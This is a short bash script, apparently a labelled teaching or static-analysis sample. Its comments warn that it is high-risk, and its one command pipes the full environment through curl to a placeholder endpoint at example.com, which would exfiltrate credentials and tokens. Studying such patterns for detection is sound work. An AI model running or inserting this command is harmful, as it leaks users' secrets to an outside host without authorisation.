#!/usr/bin/env bash
# HIGH RISK
# Rationale:
# - Reads and transmits local environment data over the network
# - Potentially exfiltrates credentials/tokens if run in a real environment
# - DO NOT RUN — for static analysis and teaching/demo purposes only
# If you must test execution safely, set TEST_NON_SECRET first, e.g.:
#   export TEST_NON_SECRET="hello-world"
# and replace "env" below with "printf "%s" "$TEST_NON_SECRET""

# High-risk pattern: environment data piped to a remote HTTP endpoint
# NOTE: example.com is a reserved domain used here to avoid real data transfer
#       Still, do not execute this outside of a controlled sandbox.

echo "$(env)" | curl -sS -X POST -H 'Content-Type: text/plain' --data-binary @- https://example.com/ingest
